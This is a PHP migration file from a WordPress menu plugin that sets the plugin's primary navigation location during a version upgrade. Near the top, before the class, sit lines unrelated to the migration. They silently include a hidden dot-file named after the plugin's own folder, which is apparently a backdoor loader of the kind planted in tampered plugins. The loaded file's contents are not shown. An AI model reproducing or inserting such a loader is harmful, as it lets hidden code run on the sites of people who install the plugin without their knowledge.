<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Theme Migrate file.
 *
 * @package crane
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GM_migrate__v1_5_6_575 extends GM_Migration {

	/**
	 * Migrate
	 *
	 * @return bool
	 */
	public function migrate() {

		$this->db_version = '1.5.6.575';

		GroovyMenuStyleStorage::getInstance()->set_disable_storage();

		$master_nav_menu = GroovyMenuUtils::getMasterNavmenu();
		$locations       = get_theme_mod( 'nav_menu_locations' );

		if ( $master_nav_menu ) {
			$locations['gm_primary'] = intval( $master_nav_menu );
			set_theme_mod( 'nav_menu_locations', $locations );
		}


		$this->success();

		return true;

	}

}
